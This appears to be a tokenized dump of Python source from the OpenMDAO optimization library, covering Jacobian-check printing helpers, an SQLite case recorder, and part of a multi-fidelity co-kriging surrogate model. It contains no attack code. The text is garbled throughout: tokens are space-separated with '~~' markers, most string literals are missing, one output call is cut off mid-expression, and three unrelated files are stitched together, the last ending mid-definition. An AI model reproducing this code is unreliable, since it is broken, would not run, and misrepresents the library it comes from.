_both_names ( tmeta , to_prom_name ) ) \n 
self . _setup_errors . append ( msg ) \n 
continue \n 
~~ else : \n 
~~~ raise \n 
\n 
# If units are not equivalent, store unit conversion tuple \n 
# in the parameter metadata \n 
~~ ~~ if scale != 1.0 or offset != 0.0 : \n 
~~~ tmeta [ ] = ( scale , offset ) \n 
\n 
~~ ~~ ~~ def _add_implicit_connections ( self , connections ) : \n 
~~~ """\n        Finds all matches between promoted names of parameters and unknowns\n        in this `Problem`.  Any matches imply an implicit connection.\n        All connections are expressed using absolute pathnames and are\n        added to the dict of explicit connections passed in.\n\n        Args\n        ----\n        connections : dict\n            A dict containing all explicit connections.\n\n        Returns\n        -------\n        set\n            promoted parameters in this `Problem` that are not implicitly\n            connected\n\n        """ \n 
\n 
dangling = set ( ) \n 
\n 
abs_unames = self . root . _sysdata . to_abs_uname \n 
\n 
for prom_name , pabs_list in iteritems ( self . root . _sysdata . to_abs_pnames ) : \n 
~~~ if prom_name in abs_unames : # param has a src in unknowns \n 
~~~ for pabs in pabs_list : \n 
~~~ connections . setdefault ( pabs , [ ] ) . append ( ( abs_unames [ prom_name ] , None ) ) \n 
~~ ~~ else : \n 
~~~ dangling . add ( prom_name ) \n 
\n 
~~ ~~ return dangling \n 
\n 
~~ def print_all_convergence ( self ) : \n 
~~~ """ Sets iprint to True for all solvers and subsolvers in the model.""" \n 
\n 
root = self . root \n 
root . ln_solver . print_all_convergence ( ) \n 
root . nl_solver . print_all_convergence ( ) \n 
for grp in root . subgroups ( recurse = True ) : \n 
~~~ grp . ln_solver . print_all_convergence ( ) \n 
grp . nl_solver . print_all_convergence ( ) \n 
\n 
~~ ~~ ~~ def _assign_parameters ( connections ) : \n 
~~~ """Map absolute system names to the absolute names of the\n    parameters they transfer data to.\n    """ \n 
param_owners = { } \n 
\n 
for par , ( unk , idxs ) in iteritems ( connections ) : \n 
~~~ param_owners . setdefault ( get_common_ancestor ( par , unk ) , set ( ) ) . add ( par ) \n 
\n 
~~ return param_owners \n 
\n 
\n 
~~ def _jac_to_flat_dict ( jac ) : \n 
~~~ """ Converts a double `dict` jacobian to a flat `dict` Jacobian. Keys go\n    from [out][in] to [out,in].\n\n    Args\n    ----\n\n    jac : dict of dicts of ndarrays\n        Jacobian that comes from calc_gradient when the return_type is \'dict\'.\n\n    Returns\n    -------\n\n    dict of ndarrays""" \n 
\n 
new_jac = OrderedDict ( ) \n 
for key1 , val1 in iteritems ( jac ) : \n 
~~~ for key2 , val2 in iteritems ( val1 ) : \n 
~~~ new_jac [ ( key1 , key2 ) ] = val2 \n 
\n 
~~ ~~ return new_jac \n 
\n 
\n 
~~ def _pad_name ( name , pad_num = 13 , quotes = True ) : \n 
~~~ """ Pads a string so that they all line up when stacked.""" \n 
l_name = len ( name ) \n 
if l_name < pad_num : \n 
~~~ pad = pad_num - l_name \n 
if quotes : \n 
~~~ pad_str = "\'{name}\'{sep:<{pad}}" \n 
~~ else : \n 
~~~ pad_str = "{name}{sep:<{pad}}" \n 
~~ pad_name = pad_str . format ( name = name , sep = , pad = pad ) \n 
return pad_name \n 
~~ else : \n 
~~~ return . format ( name ) \n 
\n 
\n 
~~ ~~ def _assemble_deriv_data ( params , resids , cdata , jac_fwd , jac_rev , jac_fd , \n 
out_stream , c_name = , jac_fd2 = None , fd_desc = None , \n 
fd_desc2 = None , compact_print = False ) : \n 
~~~ """ Assembles dictionaries and prints output for check derivatives\n    functions. This is used by both the partial and total derivative\n    checks.\n    """ \n 
started = False \n 
\n 
for p_name in params : \n 
~~~ for u_name in resids : \n 
\n 
~~~ key = ( u_name , p_name ) \n 
\n 
# Ignore non-differentiables \n 
if key not in jac_fd : \n 
~~~ continue \n 
\n 
~~ ldata = cdata [ key ] = { } \n 
\n 
Jsub_fd = jac_fd [ key ] \n 
ldata [ ] = Jsub_fd \n 
magfd = np . linalg . norm ( Jsub_fd ) \n 
\n 
if jac_fwd : \n 
~~~ Jsub_for = jac_fwd [ key ] \n 
ldata [ ] = Jsub_for \n 
magfor = np . linalg . norm ( Jsub_for ) \n 
~~ else : \n 
~~~ magfor = None \n 
\n 
~~ if jac_rev : \n 
~~~ Jsub_rev = jac_rev [ key ] \n 
ldata [ ] = Jsub_rev \n 
magrev = np . linalg . norm ( Jsub_rev ) \n 
~~ else : \n 
~~~ magrev = None \n 
\n 
~~ if jac_fd2 : \n 
~~~ Jsub_fd2 = jac_fd2 [ key ] \n 
ldata [ ] = Jsub_fd2 \n 
magfd2 = np . linalg . norm ( Jsub_fd2 ) \n 
~~ else : \n 
~~~ magfd2 = None \n 
\n 
~~ ldata [ ] = ( magfor , magrev , magfd ) \n 
\n 
if jac_fwd : \n 
~~~ abs1 = np . linalg . norm ( Jsub_for - Jsub_fd ) \n 
~~ else : \n 
~~~ abs1 = None \n 
~~ if jac_rev : \n 
~~~ abs2 = np . linalg . norm ( Jsub_rev - Jsub_fd ) \n 
~~ else : \n 
~~~ abs2 = None \n 
\n 
~~ if jac_fwd and jac_rev : \n 
~~~ abs3 = np . linalg . norm ( Jsub_for - Jsub_rev ) \n 
~~ else : \n 
~~~ abs3 = None \n 
\n 
~~ if jac_fd2 : \n 
~~~ abs4 = np . linalg . norm ( Jsub_fd2 - Jsub_fd ) \n 
~~ else : \n 
~~~ abs4 = None \n 
\n 
~~ ldata [ ] = ( abs1 , abs2 , abs3 ) \n 
\n 
if magfd == 0.0 : \n 
~~~ rel1 = rel2 = rel3 = rel4 = float ( ) \n 
~~ else : \n 
~~~ if jac_fwd : \n 
~~~ rel1 = np . linalg . norm ( Jsub_for - Jsub_fd ) / magfd \n 
~~ else : \n 
~~~ rel1 = None \n 
\n 
~~ if jac_rev : \n 
~~~ rel2 = np . linalg . norm ( Jsub_rev - Jsub_fd ) / magfd \n 
~~ else : \n 
~~~ rel2 = None \n 
\n 
~~ if jac_fwd and jac_rev : \n 
~~~ rel3 = np . linalg . norm ( Jsub_for - Jsub_rev ) / magfd \n 
~~ else : \n 
~~~ rel3 = None \n 
\n 
~~ if jac_fd2 : \n 
~~~ rel4 = np . linalg . norm ( Jsub_fd2 - Jsub_fd ) / magfd \n 
~~ else : \n 
~~~ rel4 = None \n 
\n 
~~ ~~ ldata [ ] = ( rel1 , rel2 , rel3 ) \n 
\n 
if out_stream is None : \n 
~~~ continue \n 
\n 
~~ if compact_print : \n 
~~~ if jac_fwd and jac_rev : \n 
~~~ if not started : \n 
~~~ tmp1 = "{0} wrt {1} | {2} | {3} |  {4} | {5} | {6} | {7} | {8}\\n" \n 
out_str = tmp1 . format ( _pad_name ( ) , _pad_name ( ) , \n 
_pad_name ( , 10 , quotes = False ) , \n 
_pad_name ( , 10 , quotes = False ) , \n 
_pad_name ( , 10 , quotes = False ) , \n 
_pad_name ( , 10 , quotes = False ) , \n 
_pad_name ( , 10 , quotes = False ) , \n 
_pad_name ( , 10 , quotes = False ) , \n 
_pad_name ( , 10 , quotes = False ) \n 
) \n 
out_stream . write ( out_str ) \n 
out_stream . write ( * len ( out_str ) + ) \n 
started = True \n 
\n 
~~ tmp1 = "{0} wrt {1} | {2:.4e} | {3:.4e} |  {4:.4e} | {5:.4e} | {6:.4e} | {7:.4e} | {8:.4e}\\n" out_stream . write ( tmp1 . format ( _pad_name ( u_name ) , _pad_name ( p_name ) , \n 
magfor , magrev , magfd , abs1 , abs2 , \n 
rel1 , rel2 ) ) \n 
\n 
~~ elif jac_fd and jac_fd2 : \n 
~~~ if not started : \n 
~~~ tmp1 = "{0} wrt {1} | {2} | {3} | {4} | {5}\\n" \n 
out_str = tmp1 . format ( _pad_name ( ) , _pad_name ( ) , \n 
_pad_name ( , 13 , quotes = False ) , \n 
_pad_name ( , 12 , quotes = False ) , \n 
_pad_name ( , 12 , quotes = False ) , \n 
_pad_name ( , 12 , quotes = False ) \n 
) \n 
out_stream . write ( out_str ) \n 
out_stream . write ( * len ( out_str ) + ) \n 
started = True \n 
\n 
~~ tmp1 = "{0} wrt {1} | {2: .6e} | {3:.6e} | {4: .6e} | {5: .6e}\\n" \n 
out_stream . write ( tmp1 . format ( _pad_name ( u_name ) , _pad_name ( p_name ) , \n 
magfd , magfd2 , abs4 , rel4 ) ) \n 
~~ ~~ else : \n 
\n 
~~~ if started : \n 
~~~ out_stream . write ( * 30 + ) \n 
~~ else : \n 
~~~ started = True \n 
\n 
# Optional file_like output \n 
~~ out_stream . write ( "  %s: \'%s\' wrt \'%s\'\\n\\n" % ( c_name , u_name , p_name ) ) \n 
\n 
if jac_fwd : \n 
~~~ out_stream . write ( % magfor ) \n 
~~ if jac_rev : \n 
~~~ out_stream . write ( % magrev ) \n 
~~ if not jac_fwd and not jac_rev : \n 
~~~ out_stream . write ( ~~ if jac_fd : \n 
~~~ out_stream . write ( % magfd ) \n 
if fd_desc : \n 
~~~ out_stream . write ( % fd_desc ) \n 
~~ out_stream . write ( ) \n 
~~ if jac_fd2 : \n 
~~~ out_stream . write ( % magfd2 ) \n 
if fd_desc2 : \n 
~~~ out_stream . write ( % fd_desc2 ) \n 
~~ out_stream . write ( ) \n 
~~ out_stream . write ( ) \n 
\n 
if jac_fwd : \n 
~~~ out_stream . write ( % abs1 ) \n 
~~ if jac_rev : \n 
~~~ out_stream . write ( % abs2 ) \n 
~~ if jac_fwd and jac_rev : \n 
~~~ out_stream . write ( % abs3 ) \n 
~~ if jac_fd2 : \n 
~~~ out_stream . write ( % abs4 ) \n 
~~ out_stream . write ( ) \n 
\n 
if jac_fwd : \n 
~~~ out_stream . write ( % rel1 ) \n 
~~ if jac_rev : \n 
~~~ out_stream . write ( % rel2 ) \n 
~~ if jac_fwd and jac_rev : \n 
~~~ out_stream . write ( % rel3 ) \n 
~~ if jac_fd2 : \n 
~~~ out_stream . write ( % rel4 ) \n 
~~ out_stream . write ( ) \n 
\n 
if jac_fwd : \n 
~~~ out_stream . write ( ) \n 
out_stream . write ( str ( Jsub_for ) ) \n 
out_stream . write ( ) \n 
~~ if jac_rev : \n 
~~~ out_stream . write ( ) \n 
out_stream . write ( str ( Jsub_rev ) ) \n 
out_stream . write ( ) \n 
~~ out_stream . write ( ) \n 
out_stream . write ( str ( Jsub_fd ) ) \n 
out_stream . write ( ) \n 
if jac_fd2 : \n 
~~~ out_stream . write ( ) \n 
out_stream . write ( str ( Jsub_fd2 ) ) \n 
out_stream . write ( ) \n 
\n 
~~ ~~ ~~ ~~ ~~ def _needs_iteration ( comp ) : \n 
~~~ """Return True if the given component needs an iterative\n    solver to converge it.\n    """ \n 
if isinstance ( comp , Component ) and comp . is_active ( ) and comp . states : \n 
~~~ for klass in comp . __class__ . __mro__ : \n 
~~~ if klass is Component : \n 
~~~ break \n 
~~ if in klass . __dict__ : \n 
\n 
~~~ return False \n 
~~ ~~ return True \n 
~~ return False \n 
\n 
~~ def _get_gmres_name ( ) : \n 
~~~ if MPI : \n 
~~~ return \n 
~~ else : \n 
~~~ return \n 
~~ ~~ """Class definition for SqliteRecorder, which provides dictionary backed by SQLite""" \n 
\n 
from collections import OrderedDict \n 
from sqlitedict import SqliteDict \n 
from openmdao . recorders . base_recorder import BaseRecorder \n 
from openmdao . util . record_util import format_iteration_coordinate \n 
\n 
from openmdao . core . mpi_wrap import MPI \n 
\n 
class SqliteRecorder ( BaseRecorder ) : \n 
~~~ """ Recorder that saves cases in an SQLite dictionary.\n\n    Args\n    ----\n    sqlite_dict_args : dict\n        Dictionary lf any additional arguments for the SQL db.\n\n    Options\n    -------\n    options[\'record_metadata\'] :  bool(True)\n        Tells recorder whether to record variable attribute metadata.\n    options[\'record_unknowns\'] :  bool(True)\n        Tells recorder whether to record the unknowns vector.\n    options[\'record_params\'] :  bool(False)\n        Tells recorder whether to record the params vector.\n    options[\'record_resids\'] :  bool(False)\n        Tells recorder whether to record the ressiduals vector.\n    options[\'record_derivs\'] :  bool(True)\n        Tells recorder whether to record derivatives that are requested by a `Driver`.\n    options[\'includes\'] :  list of strings\n        Patterns for variables to include in recording.\n    options[\'excludes\'] :  list of strings\n        Patterns for variables to exclude in recording (processed after includes).\n    """ \n 
\n 
def __init__ ( self , out , ** sqlite_dict_args ) : \n 
~~~ super ( SqliteRecorder , self ) . __init__ ( ) \n 
\n 
if MPI and MPI . COMM_WORLD . rank > 0 : \n 
~~~ self . _open_close_sqlitedict = False \n 
~~ else : \n 
~~~ self . _open_close_sqlitedict = True \n 
\n 
~~ if self . _open_close_sqlitedict : \n 
~~~ sqlite_dict_args . setdefault ( , True ) \n 
sqlite_dict_args . setdefault ( , ) \n 
self . out = SqliteDict ( filename = out , flag = , ** sqlite_dict_args ) \n 
~~ else : \n 
~~~ self . out = None \n 
\n 
~~ ~~ def record_metadata ( self , group ) : \n 
~~~ """Stores the metadata of the given group in a sqlite file using\n        the variable name for the key.\n\n        Args\n        ----\n        group : `System`\n            `System` containing vectors\n        """ \n 
\n 
params = group . params . iteritems ( ) \n 
resids = group . resids . iteritems ( ) \n 
unknowns = group . unknowns . iteritems ( ) \n 
\n 
data = OrderedDict ( [ ( , dict ( params ) ) , \n 
( , dict ( unknowns ) ) , \n 
] ) \n 
\n 
self . out [ ] = data \n 
\n 
~~ def record_iteration ( self , params , unknowns , resids , metadata ) : \n 
~~~ """\n        Stores the provided data in the sqlite file using the iteration\n        coordinate for the key.\n\n        Args\n        ----\n        params : dict\n            Dictionary containing parameters. (p)\n\n        unknowns : dict\n            Dictionary containing outputs and states. (u)\n\n        resids : dict\n            Dictionary containing residuals. (r)\n\n        metadata : dict, optional\n            Dictionary containing execution metadata (e.g. iteration coordinate).\n        """ \n 
\n 
data = OrderedDict ( ) \n 
iteration_coordinate = metadata [ ] \n 
timestamp = metadata [ ] \n 
\n 
group_name = format_iteration_coordinate ( iteration_coordinate ) \n 
\n 
data [ ] = timestamp \n 
data [ ] = metadata [ ] \n 
data [ ] = metadata [ ] \n 
\n 
if self . options [ ] : \n 
~~~ data [ ] = self . _filter_vector ( params , , iteration_coordinate ) \n 
\n 
~~ if self . options [ ] : \n 
~~~ data [ ] = self . _filter_vector ( unknowns , , iteration_coordinate ) \n 
\n 
~~ if self . options [ ] : \n 
~~~ data [ ] = self . _filter_vector ( resids , , iteration_coordinate ) \n 
\n 
~~ self . out [ group_name ] = data \n 
\n 
~~ def record_derivatives ( self , derivs , metadata ) : \n 
~~~ """Writes the derivatives that were calculated for the driver.\n\n        Args\n        ----\n        derivs : dict\n            Dictionary containing derivatives\n\n        metadata : dict, optional\n            Dictionary containing execution metadata (e.g. iteration coordinate).\n        """ \n 
\n 
data = OrderedDict ( ) \n 
iteration_coordinate = metadata [ ] \n 
timestamp = metadata [ ] \n 
\n 
group_name = format_iteration_coordinate ( iteration_coordinate ) \n 
group_name = % group_name \n 
\n 
data [ ] = timestamp \n 
data [ ] = metadata [ ] \n 
data [ ] = metadata [ ] \n 
data [ ] = derivs \n 
\n 
self . out [ group_name ] = data \n 
\n 
~~ def close ( self ) : \n 
~~~ """Closes `out`""" \n 
\n 
if self . _open_close_sqlitedict : \n 
~~~ if self . out is not None : \n 
~~~ self . out . close ( ) \n 
self . out = None \n 
~~ ~~ ~~ ~~ """\nThis module integrates the Multi-Fidelity Co-Kriging method described in\n[LeGratiet2013].\n(Author: Remi Vauclin <vauclin.remi@gmail.com>)\n\nThis code was implemented using the package scikit-learn as basis.\n(Author: Vincent Dubourg <vincent.dubourg@gmail.com>)\n\nOpenMDAO adaptation. Regression and correlation functions were directly copied\nfrom scikit-learn package here to avoid scikit-learn dependency.\n(Author: Remi Lafage <remi.lafage@onera.fr>)\n\nISAE/DMSM - ONERA/DCPS\n""" \n 
\n 
import numpy as np \n 
from numpy import atleast_2d as array2d \n 
\n 
from scipy import linalg \n 
from scipy . optimize import minimize \n 
from scipy . spatial . distance import squareform \n 
\n 
from openmdao . surrogate_models . surrogate_model import MultiFiSurrogateModel \n 
\n 
import logging \n 
_logger = logging . getLogger ( ) \n 
\n 
MACHINE_EPSILON = np . finfo ( np . double ) . eps # machine precision \n 
NUGGET = 10. * MACHINE_EPSILON # nugget for robustness \n 
\n 
INITIAL_RANGE_DEFAULT = 0.3 # initial range for optimizer \n 
TOLERANCE_DEFAULT = 1e-6 # stopping criterion for MLE optimization \n 
\n 
THETA0_DEFAULT = 0.5 \n 
THETAL_DEFAULT = 1e-5 \n 
THETAU_DEFAULT = 50 \n 
\n 
if hasattr ( linalg , ) : \n 
# only in scipy since 0.9 \n 
~~~ solve_triangular = linalg . solve_triangular \n 
~~ else : \n 
# slower, but works \n 
~~~ def solve_triangular ( x , y , lower = True ) : \n 
~~~ return linalg . solve ( x , y ) \n 
\n 
\n 
~~ ~~ def constant_regression ( x ) : \n 
~~~ """\n    Zero order polynomial (constant, p = 1) regression model.\n    x --> f(x) = 1\n    """ \n 
x = np . asarray ( x , dtype = np . float ) \n 
n_eval = x . shape [ 0 ] \n 
f = np . ones ( [ n_eval , 1 ] ) \n 
return f \n 
\n 
~~ def linear_regression ( x ) : \n 
~~~ """\n    First order polynomial (linear, p = n+1) regression model.\n    x --> f(x) = [ 1, x_1, ..., x_n ].T\n    """ \n 
x = np . asarray ( x , dtype = np . float ) \n 
n_eval = x . shape [ 0 ] \n 
f = np . hstack ( [ np . ones ( [ n_eval , 1 ] ) , x ] ) \n 
return f \n 
\n 
~~ def squared_exponential_correlation ( theta , d ) : \n 
~~~ """\n    Squared exponential correlation model (Radial Basis Function).\n    (Infinitely differentiable stochastic process, very smooth)::\n\n                                            n\n        theta, dx --> r(theta, dx) = exp(  sum  - theta_i * (dx_i)^2 )\n                                          i = 1\n\n    Args\n    ----\n\n    theta: array_like\n        An array with shape 1 (isotropic) or n (anisotropic) giving the\n        autocorrelation parameter(s).\n\n    dx: array_like\n        An array with shape (n_eval, n_features) giving the componentwise\n        distances between locations x and x\' at which the correlation model\n        should be evaluated.\n\n    Returns\n    -------\n\n    r: array_like\n        An array with shape (n_eval, ) containing the values of the\n        autocorrelation model.\n    """ \n 
\n 
theta = np . asarray ( theta , dtype = np . float ) \n 
d = np . asarray ( d , dtype = np . float ) \n 
\n 
if d . ndim > 1 : \n 
~~~ n_features = d . shape [ 1 ] \n 
~~ else : \n 
~~~ n_features = 1 \n 
\n 
~~ if theta . size == 1 : \n 
~~~ return np . exp ( - theta [ 0 ] * np . sum ( d ** 2 , axis = 1 ) ) \n 
~~ elif theta . size != n_features : \n 
~~~ raise ValueError ( "Length of theta must be 1 or %s" % n_features ) \n 
~~ else : \n 
~~~ return np . exp ( - np . sum ( theta . reshape ( 1 , n_features ) * d ** 2 , axis = 1 ) ) \n 
\n 
\n 
~~ ~~ def l1_cross_distances ( X , Y = None ) : \n 
~~~ """\nComputes the nonzero componentwise L1 cross-distances between the vectors\nin X and Y.\n\nArgs\n----\n\nX: array_like\n    An array with shape (n_samples_X, n_features)\n\nY: array_like\n    An array with shape (n_samples_Y, n_features)\n\nReturns\n-------\n\nD: array with shape (n_samples * (n_samples - 1) / 2, n_features)\n    The array of componentwise L1 cross-distances.\n\n""" \n 
if Y is None : \n 
~~~ X = array2d ( X ) \n 
n_samples , n_features = X . shape \n 
n_nonzero_cross_dist = n_samples * ( n_samples - 1 ) // 2 \n 
D = np . zeros ( ( n_nonzero_cross_dist , n_features ) ) \n 
ll_1 = 0 \n 
for k in range ( n_samples - 1 ) : \n 
~~~ ll_0 = ll_1 \n 
ll_1 = ll_0 + n_samples - k - 1 \n 
D [ ll_0 : ll_1 ] = np . abs ( X [ k ] - X [ ( k + 1 ) : ] ) \n 
\n 
~~ return D \n 
\n 
~~ else : \n 
~~~ X = array2d ( X ) \n 
Y = array2d ( Y ) \n 
n_samples_X , n_features_X = X . shape \n 
n_samples_Y , n_features_Y = Y . shape \n 
if n_features_X != n_features_Y : \n 
~~~ raise ValueError ( "X and Y must have the same dimensions." ) \n 
~~ n_features = n_features_X \n 
\n 
n_nonzero_cross_dist = n_samples_X * n_samples_Y \n 
D = np . zeros ( ( n_nonzero_cross_dist , n_features ) ) \n 
ll_1 = 0 \n 
for k in range ( n_samples_X ) : \n 
~~~ ll_0 = ll_1 \n 
ll_1 = ll_0 + n_samples_Y # - k - 1 \n 
D [ ll_0 : ll_1 ] = np . abs ( X [ k ] - Y ) \n 
\n 
~~ return D \n 
\n 
\n 
~~ ~~ class MultiFiCoKriging ( object ) : \n 
\n 
~~~ """\nThis class integrates the Multi-Fidelity Co-Kriging method described in\n[LeGratiet2013]_.\n\nArgs\n----\n\nregr: string or callable, optional\n    A regression function returning an array of outputs of the linear\n    regression functional basis for Universal Kriging purpose.\n    regr is assumed to be the same for all levels of code.\n    Default assumes a simple constant regression trend.\n    Available built-in regression models are:\n    \'constant\', \'linear\'\n\nrho_regr: string or callable, optional\n    A regression function returning an array of outputs of the linear\n    regression functional basis. Defines the regression function for the\n    autoregressive parameter rho.\n    rho_regr is assumed to be the same for all levels of code.\n    Default assumes a simple constant regression trend.\n    Available built-in regression models are:\n    \'constant\', \'linear\'\n\ntheta: double, array_like or list, optional\n    Value of correlation parameters if they are known; no optimization is run.\n    Default is None, so that optimization is run.\n    if double: value is replicated for all features and all levels.\n    if array_like: an array with shape (n_features, ) for\n    isotropic calculation. It is replicated for all levels.\n    if list: a list of nlevel arrays specifying value for each level\n\ntheta0: double, array_like or list, optional\n    Starting point for the maximum likelihood estimation of the\n    best set of parameters.\n    Default is None and meaning use of the default 0.5*np.ones(n_features)\n    if double: value is replicated for all features and all levels.\n    if array_like: an array with shape (n_features, ) for\n    isotropic calculation. It is replicated for all levels.\n    if list: a list of nlevel arrays specifying value for each level\n\nthetaL: double, array_like or list, optional\n    Lower bound on the autocorrelation parameters for maximum\n    likelihood estimation.\n    Default is None meaning use of the default 1e-5*np.ones(n_features).\n    if double: value is replicated for all features and all levels.\n    if array_like: An array with shape matching theta0\'s. It is replicated\n    for all levels of code.\n    if list: a list of nlevel arrays specifying value for each level\n\nthetaU: double, array_like or list, optional\n    Upper bound on the autocorrelation parameters for maximum\n    likelihood estimation.\n    Default is None meaning use of default value 50*np.ones(n_features).\n    if double: value is replicated for all features and all levels.\n    if array_like: An array with shape matching theta0\'s. It is replicated\n    for all levels of code.\n    if list: a list of nlevel arrays specifying value for each level\n\n\nAttributes\n----------\n\n`theta`: list\n    Specified theta for each level OR the best set of autocorrelation parameters\n    (the sought maximizer of the reduced likelihood function).\n\n`rlf_value`: list\n    The optimal negative concentrated reduced likelihood function value\n    for each level.\n\n\nExamples\n--------\n\n>>> from openmdao.surrogate_models.multifi_cokriging import MultiFiCoKriging\n>>> import numpy as np\n>>> # Xe: DOE for expensive code (nested in Xc)\n>>> # Xc: DOE for cheap code\n>>> # ye: expensive response\n>>> # yc: cheap response\n>>> Xe = np.array([[0],[0.4],[1]])\n>>> Xc = np.vstack((np.array([[0.1],[0.2],[0.3],[0.5],[0.6],[0.7],[0.8],[0.9]]),Xe))\n>>> ye = ((Xe*6-2)**2)*np.sin((Xe*6-2)*2)\n>>> yc = 0.5*((Xc*6-2)**2)*np.sin((Xc*6-2)*2)+(Xc-0.5)*10. - 5\n>>> model = MultiFiCoKriging(theta0=1, thetaL=1e-5, thetaU=50.)\n>>> model.fit([Xc, Xe], [yc, ye])\n>>> # Prediction on x=0.05\n>>> np.abs(float(model.predict([0.05])[0])- ((0.05*6-2)**2)*np.sin((0.05*6-2)*2)) < 0.05\nTrue\n\n\nNotes\n-----\n\nImplementation is based on the Package Scikit-Learn\n(Author: Vincent Dubourg <vincent.dubourg@gmail.com>) which translates\nthe DACE Matlab toolbox, see [NLNS2002]_.\n\n\nReferences\n----------\n\n.. [NLNS2002] H. B. Nielsen, S. N. Lophaven, and J. Sondergaard.\n   `DACE - A MATLAB Kriging Toolbox.` (2002)\n   http://www2.imm.dtu.dk/~hbn/dace/dace.pdf\n\n.. [WBSWM1992] W. J. Welch, R. J. Buck, J. Sacks, H. P. Wynn, T. J. Mitchell,\n   and M. D. Morris (1992). "Screening, predicting, and computer experiments."\n   `Technometrics,` 34(1) 15--25.\n   http://www.jstor.org/pss/1269548\n\n.. [LeGratiet2013] L. Le Gratiet (2013). "Multi-fidelity Gaussian process\n   regression for computer experiments."\n   PhD thesis, Universite Paris-Diderot-Paris VII.\n\n.. [TBKH2011] Toal, D. J., Bressloff, N. W., Keane, A. J., & Holden, C. M. E. (2011).\n   "The development of a hybridized particle swarm for kriging hyperparameter\n   tuning." `Engineering optimization`, 43(6), 675-699.\n   """ \n 
\n 
_regression_types = { \n 
: constant_regression , \n 
: linear_regression } \n 
\n 
def __init__ ( self , regr = , rho_regr = , \n 
theta = None , theta0 = None , thetaL = None , thetaU = None ) : \n 
\n 
~~~ self . corr = squared_exponential_correlation \n 
self . regr = regr \n 
self . rho_regr = rho_regr \n 
self . theta = theta \n 
self . theta0 = theta0 \n 
self . thetaL = thetaL \n 
self . thetaU = thetaU \n 
\n 
self . _nfev = 0 \n 
\n 
~~ def _build_R ( self , lvl , theta ) : \n 
~~~ """\n        Builds the correlation matrix with given theta for the specified level.\n        """ \n 
\n 
D = self . D [ lvl ] \n 
n_samples = self . n_samples [ lvl ] \n 
\n 
R = np . eye ( n_samples ) * ( 1. + NUGGET ) \n 
\n 
corr = squareform ( self . corr ( theta , D ) ) \n 
R = R + corr \n 
\n 
return R \n 
\n 
\n 
~~ def fit ( self , X , y , \n 
initial_range = INITIAL_RANGE_DEFAULT , tol = TOLERANCE_DEFAULT ) : \n 
~~~ """\nThe Multi-Fidelity co-kriging model fitting method.\n\nArgs\n----\n\nX: list of double array_like elements\n    A list of arrays with the input at which observations were made, from lowest\n    fidelity to highest fidelity. Designs must be nested\n    with X[i] = np.vstack([..., X[i+1])\n\ny: list of double array_like elements\n    A list of arrays with the observations of the scalar output to be predicted,\n    from lowest fidelity to highest fidelity.\n\ninitial_range: float\n    Initial range for the optimizer.\n\ntol: float\n    Optimizer terminates when the tolerance tol is reached.\n\n""" \n 
# Run input checks \n 
# Transforms floats and arrays in lists to have a multifidelity structure \n 
self . _check_list_structure ( X , y ) \n 
# Checks if all parameters are structured as required \n 
self . _check_params ( ) \n 
\n 
X = self . X \n 
y = self . y \n 
nlevel = self . nlevel \n 
n_samples = self . n_samples \n 
\n 
# initialize lists \n 
self . beta = nlevel * [ 0 ] \n 
self . beta_rho = nlevel * [ None ] \n 
self . beta_regr = nlevel * [ None ] \n 
self . C = nlevel * [ 0 ] \n 
self . D = nlevel * [ 0 ] \n 
self . F = nlevel * [ 0 ] \n 
self . p = nlevel * [ 0 ] \n 
self . q = nlevel * [ 0 ] \n 
self . G = nlevel * [ 0 ] \n 
self . sigma2 = nlevel * [ 0 ] \n 
self . _R_adj = nlevel * [ None ] \n 
\n 
y_best = y [ nlevel - 1 ] \n 
for i in range ( nlevel - 1 ) [ : : - 1 ] : \n 
~~~ y_best = np . concatenate ( ( y [ i ] [ : - n_samples [ i + 1 ] ] , y_best ) ) \n 
~~ self . y_best = y_best \n 
\n 
self . y_mean = np . zeros ( 1 ) \n 
self . y_std = np . ones ( 1 ) \n 
self . X_mean = np . zeros ( 1 ) \n 
self . X_std = np . ones ( 1 ) \n 
\n 
for lvl in range ( nlevel ) : \n 
\n 
# Calculate matrix of distances D between samples \n 
~~~ self . D [ lvl ] = l1_cross_distances ( X [ lvl ] ) \n 
if ( np . min ( np . sum ( self . D [ lvl ] , axis = 1 ) ) == 0. ) : \n 
~~~ raise Exception ( "Multiple input features cannot have the same" \n 
" value." ) \n 
\n 
# Regression matrix and parameters \n 
~~ self . F [ lvl ] = self . regr ( X [ lvl ] ) \n 
self . p [ lvl ] = self . F [ lvl ] . shape [ 1 ] \n 
\n 
# Concatenate the autoregressive part for levels > 0 \n 
if lvl > 0 : \n 
~~~ F_rho = self . rho_regr ( X [ lvl ] ) \n 
self . q [ lvl ] = F_rho . shape [ 1 ] \n 
self . F [ lvl ] = np . hstack ( ( F_rho * np . dot ( ( self . y [ lvl - 1 ] ) [ - n_samples [ lvl ] : ] , \n 
np . ones ( ( 1 , self . q [ lvl ] ) ) ) , self . F [ lvl ] ) ) \n 
~~ else : \n 
~~~ self . q [ lvl ] = 0 \n 
\n 
~~ n_samples_F_i = self . F [ lvl ] . shape [ 0 ] \n 
\n 
if n_samples_F_i != n_samples [ lvl ] : \n 
~~~ raise Exception ( "Number of rows in F and X do not match. Most " \n 
"likely something is going wrong with the " \n 
"regression model." ) \n 
\n 
~~ if int ( self . p [ lvl ] + self . q [ lvl ] ) >= n_samples_F_i : \n 
~~~ raise Exception ( ( "Ordinary least squares problem is undetermined " \n 
"n_samples=%d must be greater than the regression" \n 
" model size p+q=%d." ) \n 
% ( n_samples [ i ] , self . p [ lvl ] + self . q [ lvl ] ) ) \n 
\n 
# Set attributes \n 
~~ ~~ self . X = X \n 
self . y = y \n 
\n 
self . rlf_value = np . zeros ( nlevel ) \n 
\n 
for lvl in range ( nlevel ) : \n 
# Determine Gaussian Process model parameters \n 
~~~ if self . theta [ lvl ] is None : \n 
# Maximum Likelihood Estimation of the parameters \n 
~~~ sol = self . _max_rlf ( lvl = lvl , initial_range = initial_range , tol = tol ) \n 
self . theta [ lvl ] = sol [ ] \n 
self . rlf_value [ lvl ] = sol [ ] \n 
\n 
if np . isinf ( self . rlf_value [ lvl ] ) : \n 
~~~ raise Exception ( "Bad parameter region. " \n 
"Try increasing upper bound" ) \n 
~~ ~~ else : \n 
~~~ self . rlf_value [ lvl ] = self . rlf ( lvl = lvl ) \n 
if np . isinf ( self . rlf_value [ lvl ] ) : \n 
~~~ raise Exception ( "Bad point. Try increasing theta0." ) \n 
\n 
~~ ~~ ~~ return \n 
\n 
\n 
\n 
~~ def rlf ( self , lvl , theta = None ) : \n 
